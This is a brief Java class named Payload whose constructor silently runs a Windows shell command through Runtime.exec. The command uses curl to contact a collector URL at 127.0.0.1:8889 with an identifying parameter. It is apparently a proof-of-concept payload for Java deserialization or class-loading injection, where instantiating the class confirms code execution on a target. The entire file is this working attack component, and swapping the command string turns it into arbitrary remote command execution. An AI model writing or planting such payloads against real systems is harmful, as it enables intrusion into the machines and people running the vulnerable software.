public class Payload {
   public Payload() {
        try {
            String cmd = "cmd /c curl http://127.0.0.1:8889/collect/?id=me";
            Runtime.getRuntime().exec(cmd);
        }
        catch(Exception e) {}
   }
}